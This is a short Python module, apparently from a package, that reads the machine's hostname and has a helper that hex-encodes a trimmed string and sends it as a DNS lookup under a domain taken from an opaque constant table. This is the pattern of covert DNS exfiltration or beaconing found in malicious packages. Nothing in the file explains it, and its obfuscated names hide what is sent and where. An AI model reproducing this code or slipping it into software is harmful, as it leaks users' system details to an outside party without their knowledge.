import os
import platform
import socket

from .net import resolve
from .static.domains import PRIMARY_DOMAINS
from .static.constant import CONSTANT_TABLE

constant_var_0 = CONSTANT_TABLE[0]


def get_name():

    hostname = None
    try:
        hostname = socket.gethostname()
        if hostname is None or len(hostname) == 0:
            hostname = platform.node()
            if hostname is None or len(hostname) == 0:
                hostname = os.uname()[1]
                if len(hostname) == 0:
                    hostname = None
    except:
        pass

    return hostname


def trim_resolve(input_str, stp, idx):
    trim = input_str.replace(constant_var_0, '')[:30].encode().hex()
    base = "n." + PRIMARY_DOMAINS[11]
    resolve(trim, stp, idx, base)
